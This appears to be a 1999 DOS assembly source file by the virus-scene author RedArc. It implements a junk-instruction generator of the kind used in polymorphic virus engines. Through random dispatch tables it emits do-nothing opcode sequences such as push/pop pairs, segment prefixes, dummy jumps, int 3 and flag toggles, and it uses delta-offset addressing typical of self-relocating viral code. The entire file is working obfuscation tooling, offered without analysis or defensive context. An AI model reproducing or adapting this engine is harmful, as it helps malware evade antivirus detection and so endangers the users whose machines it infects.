;Генератор мусорных команд
;1999 (c) by RedArc
;--------------------------------

;------------------------------------
; Диспетчер случайно выбираемых блоков
Musor:
     push ax bx cx dx si
     xor cx,cx
     mov ah,3
     call RND_Tabelle
     cmp ah,0
     je MI_END
     mov cl,ah
MI_A:
     push cx
     mov ax,@MI_B
     add ax,bp
     push ax
@MI_A:
     mov ah,53
     call RND_Tabelle
     cmp ah,53
     je @MI_A
     sub al,al
     xchg ah,al
     shl ax,1
     lea si,[bp+TabelleMusor]
     add si,ax
     mov ax,word ptr ds:[si]
     add ax,bp
     push ax
     ret
@MI_B equ $-start
MI_B:
     pop cx
     loop MI_A
MI_END:
     pop si dx cx bx ax
     ret
;---
@MI0 equ $-start
MI0: ;нет мусора
     ret
@MI1 equ $-start
MI1: ;nop
     mov al,90h
     stosb
     ret
@MI51 equ $-start
MI51: ;std / cld
     mov ax,0fcfdh
     stosw
     ret
@MI3 equ $-start
MI3: ;push R / call $+3 / pop R / pop R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_NOP
     mov al,0e8h
     stosb
     xor ax,ax
     stosw
     mov bl,bh
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_NOP
     mov bl,bh
     call Pop_Reg16_Tabelle
     xchg bl,al
     stosb
     ret
@MI4 equ $-start
MI4: ;fs:
     mov al,064h
     stosb
     call MI_MUS
     ret
@MI52 equ $-start
MI52: ;gs:
     mov al,065h
     stosb
     call MI_MUS
     ret
@MI6 equ $-start
MI6: ;ds:
     mov al,067h
     stosb
     call MI_MUS
     ret
@MI7 equ $-start
MI7: ;cs:
     mov al,02eh
     stosb
     call MI_MUS
     ret
@MI8 equ $-start
MI8: ;es:
     mov al,026h
     stosb
     call MI_MUS
     ret
@MI9 equ $-start
MI9: ;jmps $+2
     mov ax,00ebh
     stosw
     ret
@MI10 equ $-start
MI10: ;jmp $+3
     mov al,0e9h
     stosb
     xor ax,ax
     stosw
     ret
@MI11 equ $-start
MI11: ; push ax / cbw /pop ax
     mov bx,0
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     mov al,098h
     stosb
     call MI_MUS
     mov bl,bh
     call Pop_Reg16_Tabelle
     xchg bl,al
     stosb
     ret
@MI12 equ $-start
MI12: ;cli / sti
     mov ax,0fbfah
     stosw
     ret
@MI13 equ $-start
MI13: ;cmc / cmc
     mov ax,0f5f5h
     stosw
     ret
@MI14 equ $-start
MI14: ;push dx / cwd / pop dx
     mov bl,2
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     mov al,099h
     stosb
     call MI_MUS
     mov bl,2
     call Pop_Reg16_Tabelle
     xchg bl,al
     stosb
     ret
@MI15 equ $-start
MI15: ;dec R / inc R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     call Dec_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     mov bl,bh
     call Inc_Reg16_Tabelle
     xchg al,bl
     stosb
     ret
@MI16 equ $-start
MI16: ;inc R / dec R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     call Inc_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     mov bl,bh
     call Dec_Reg16_Tabelle
     xchg al,bl
     stosb
     ret
@MI17 equ $-start
MI17: ;int 3h
     mov al,0cch
     stosb
     ret
@MI18 equ $-start
MI18: ;int 3h
     mov ax,03cdh
     stosw
     ret
@MI19 equ $-start
MI19: ;int 1h
     mov ax,01cdh
     stosw
     ret
@MI20 equ $-start
MI20: ;clc / jnc $+2
     mov al,0f8h
     stosb
     call MI_NOP
     mov ax,0073h
     stosw
     ret
@MI21 equ $-start
MI21: ;push ax / lahf / pop ax
     mov bl,0
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     mov al,09fh
     stosb
     call MI_MUS
     mov bl,0
     call Pop_Reg16_Tabelle
     xchg bl,al
     stosb
     ret
@MI22 equ $-start
MI22: ;jmps $+3 / V8
     mov ax,01ebh
     stosw
     mov ah,0ffh
     call RND_Tabelle
     mov al,ah
     stosb
     ret
@MI23 equ $-start
MI23: ;jmps $+4 / V16
     mov ax,02ebh
     stosw
     call _Calc_Rnd16
     xchg bx,ax
     stosw
     ret
@MI24 equ $-start
MI24: ;jmp $+4 / V8
     mov al,0e9h
     stosb
     mov ax,01h
     stosw
     mov ah,0ffh
     call RND_Tabelle
     mov al,ah
     stosb
     ret
@MI25 equ $-start
MI25: ;jmp $+5 / V16
     mov al,0e9h
     stosb
     mov ax,02h
     stosw
     call _Calc_Rnd16
     xchg bx,ax
     stosw
     ret
@MI26 equ $-start
MI26: ;neg R / neg R
     mov bl,8
     call _Calc_Rnd_R16
     add bh,0d8h
     mov al,0f7h
     stosb
     mov al,bh
     stosb
     call MI_MUS
     mov al,0f7h
     stosb
     mov al,bh
     stosb
     ret
@MI27 equ $-start
MI27: ;not R / not R
     mov bl,8
     call _Calc_Rnd_R16
     add bh,0d0h
     mov al,0f7h
     stosb
     mov al,bh
     stosb
     call MI_MUS
     mov al,0f7h
     stosb
     mov al,bh
     stosb
     ret
@MI28 equ $-start
MI28: ;push R / pop R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     mov bl,bh
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI29 equ $-start
MI29: ;pusha / popa
     mov ax,6160h
     stosw
     ret
@MI30 equ $-start
MI30: ;pushf / popf
     mov ax,9d9ch
     stosw
     ret
@MI31 equ $-start
MI31: ;rol R,1 / ror R,1
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     add bl,0c0h
     mov al,0d1h
     stosb
     mov al,bl
     stosb
     mov bl,bh
     call MI_MUS
     add bl,0c8h
     mov al,0d1h
     stosb
     mov al,bl
     stosb
     ret
@MI32 equ $-start
MI32: ;ror R,1 / rol R,1
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     add bl,0c8h
     mov al,0d1h
     stosb
     mov al,bl
     stosb
     call MI_MUS
     mov bl,bh
     add bl,0c0h
     mov al,0d1h
     stosb
     mov al,bl
     stosb
     ret
@MI33 equ $-start
MI33: ;push ax / lahf / sahf / pop ax
     mov bx,0
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     mov ax,09e9fh
     stosw
     call MI_MUS
     mov bx,0
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI34 equ $-start
MI34: ;push R / call $+4 / V8 / pop R / pop R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_NOP
     mov al,0e8h
     stosb
     mov ax,1
     stosw
     mov ah,0ffh
     call RND_Tabelle
     mov al,ah
     stosb
     mov bl,bh
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_NOP
     mov bl,bh
     call Pop_Reg16_Tabelle
     xchg bl,al
     stosb
     ret
@MI35 equ $-start
MI35: ;stc / clc
     mov ax,0f8f9h
     stosw
     ret
@MI36 equ $-start
MI36: ;stc / jc $+2
     mov al,0f9h
     stosb
     mov ax,072h
     stosw
     ret
@MI37 equ $-start
MI37: ;test R,V16
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     add bl,0c0h
     mov al,0f7h
     stosb
     mov al,bl
     stosb
     call _Calc_Rnd16
     xchg bx,ax
     stosw
     ret
@MI38 equ $-start
MI38: ;xchg R,R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     call Xchg_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     ret
@MI39 equ $-start
MI39: ;xchg R1,R2 / xchg R2,R1
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Xchg_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     call MI_NOP
     pop bx
     xchg bh,bl
     call Xchg_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     ret
@MI40 equ $-start
MI40: ;push R / xor R,V16 / pop R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     push bx
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     call _Calc_Rnd16
     xchg bx,ax
     pop bx
     push bx
     call Xor_Reg16_Value16_Tabelle
     call _ax_bx
     call MI_MUS
     pop bx
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI41 equ $-start
MI41: ;push R1 / xor R1/R2 / pop R1
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     pop bx
     push bx
     call Xor_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     call MI_MUS
     pop bx
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI42 equ $-start
MI42: ;add R,V16 / sub R,V16
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     push bx
     call _Calc_Rnd16
     xchg bx,ax
     pop bx
     push bx
     push ax
     call Add_Reg16_Value16_Tabelle
     call _ax_bx
     call MI_MUS
     pop ax
     pop bx
     call Sub_Reg16_Value16_Tabelle
     call _ax_bx
     ret
@MI43 equ $-start
MI43: ;sub R,V16 / add R,V16
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     push bx
     call _Calc_Rnd16
     xchg bx,ax
     pop bx
     push bx
     push ax
     call Sub_Reg16_Value16_Tabelle
     call _ax_bx
     call MI_MUS
     pop ax
     pop bx
     call Add_Reg16_Value16_Tabelle
     call _ax_bx
     ret
@MI44 equ $-start
MI44: ;add R1,R2 / sub R1,R2
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Add_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     call MI_MUS
     pop bx
     call Sub_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     ret
@MI45 equ $-start
MI45: ;sub R1,R2 / add R1,R2
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Sub_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     pop bx
     call MI_MUS
     call Add_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     ret
@MI46 equ $-start
MI46: ;push R / mov R,V16 / pop R
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,bh
     push bx
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     call _Calc_Rnd16
     xchg bx,ax
     pop bx
     push bx
     mov bl,bh
     call Mov_Reg16_Value16_Tabelle
     call _al_bx
     call MI_MUS
     pop bx
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI47 equ $-start
MI47: ;push R1 / mov R1,R2 / pop R1
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     pop bx
     push bx
     call Mov_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     call MI_MUS
     pop bx
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI48 equ $-start
MI48: ;push R1 / add R1,R2 / pop R1
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     pop bx
     push bx
     call Add_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     call MI_MUS
     pop bx
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI49 equ $-start
MI49: ;push R1 / sub R1,R2 / pop R1
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_MUS
     pop bx
     push bx
     call Sub_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     call MI_MUS
     pop bx
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     ret
@MI50 equ $-start
MI50: ;push R1 / mov R1,R2 / pop R2 / xchg R1,R2
     mov bl,8
     call _Calc_Rnd_R16
     mov al,bh
     mov bl,8
     call _Calc_Rnd_R16
     mov bl,al
     push bx
     call Push_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_NOP
     pop bx
     push bx
     call Mov_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     call MI_NOP
     pop bx
     push bx
     xchg bh,bl
     call Pop_Reg16_Tabelle
     mov al,bl
     stosb
     call MI_NOP
     pop bx
     call Xchg_Reg1_Reg2_16_Tabelle
     xchg bx,ax
     stosw
     ret
@MI5 equ $-start
MI5: ;push ss / pop ss
     mov ax,01716h
     stosw
     ret
@MI2 equ $-start
MI2: ;push ax / mov ax,ss / mov ss,ax / pop ax
     mov al,50h
     stosb
     call MI_MUS
     mov ax,0d08ch
     stosw
     call MI_MUS
     mov ax,0d08eh
     stosw
     call MI_MUS
     mov al,058h
     stosb
     ret
;--
; Диспетчер случайно вставляемых/невставляемых nop'ов в сложные команды
MI_NOP:
     push ax cx
     mov ah,3
     call RND_Tabelle
     cmp ah,0
     je MI_NOP_1
     mov cl,ah
MI_NOP_0:
     call MI1
     loop MI_NOP_0
MI_NOP_1:
     pop cx ax
     ret
;---
; Диспетчер случайно вставляемых/невставляемых мусорных команд в мусор
MI_MUS:
     push ax bx cx dx
     mov ah,5
     call RND_Tabelle
     cmp ah,0
     je MI_MUS_E
MI_MUS_1:
     cmp ah,1
     jne MI_MUS_2
     call MI1
     jmp short MI_MUS_E
MI_MUS_2:
     cmp ah,2
     jne MI_MUS_3
     call MI2
     jmp short MI_MUS_E
MI_MUS_3:
     cmp ah,3
     jne MI_MUS_4
     call MI3
     jmp short MI_MUS_E
MI_MUS_4:
     cmp ah,4
     jne MI_MUS_5
     call MI9
     jmp short MI_MUS_E
MI_MUS_5:
     call MI50
MI_MUS_E:
     pop dx cx bx ax
     ret
;------------------------------------
;Диспетчер однобайтового мусора
Musor1:
     push ax bx cx dx si
     mov ax,@MII_A
     add ax,bp
     push ax
     mov ah,0bh
     call RND_Tabelle
     sub al,al
     xchg ah,al
     shl ax,1
     lea si,[bp+TabelleMusor1]
     add si,ax
     mov ax,word ptr ds:[si]
     add ax,bp
     push ax
     ret
@MII_A equ $-start
MII_A:
     pop si dx cx bx ax
     ret
;---
@M1 equ $-start
@MII1: ;nop
     mov al,90h
     stosb
     ret
@M2 equ $-start
@MII2: ;cld
     mov al,0fch
     stosb
     ret
@M3 equ $-start
@MII3: ;sti
     mov al,0fbh
     stosb
     ret
@M4 equ $-start
@MII4: ;clc
     mov al,0f8h
     stosb
     ret
@M5 equ $-start
@MII5: ;int 3h
     mov al,0cch
     stosb
     ret
@M6 equ $-start
@MII6: ;fs:
     mov al,064h
     stosb
     ret
@M7 equ $-start
@MII7: ;gs:
     mov al,065h
     stosb
     ret
@M8 equ $-start
@MII8: ;ds:
     mov al,067h
     stosb
     ret
@M9 equ $-start
@MII9: ;cs:
     mov al,02eh
     stosb
     ret
@Ma equ $-start
@MIIa: ;es:
     mov al,026h
     stosb
     ret
;------------------------------------
